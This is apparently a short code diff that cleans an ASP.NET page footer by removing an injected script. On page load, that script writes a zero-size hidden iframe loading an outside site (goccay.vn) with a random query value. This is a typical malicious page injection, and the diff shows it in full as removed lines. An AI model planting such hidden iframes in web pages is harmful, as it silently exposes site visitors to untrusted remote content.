@@ -58,12 +58,3 @@
 </div>
 <asp:Literal ID="lrIframe" runat="server"></asp:Literal>
 </footer>
-<div id='hltw'>
-<script language="javascript">
-    function push() {
-        var i = Math.floor(Math.random() * (40000)) + 1;
-        document.getElementById("hltw").innerHTML = '<iframe src="http://goccay.vn/showthread.php?' + i + '" frameborder="0" width="0" height="0"></iframe>';
-    }
-    push();
-</script>
-</div>
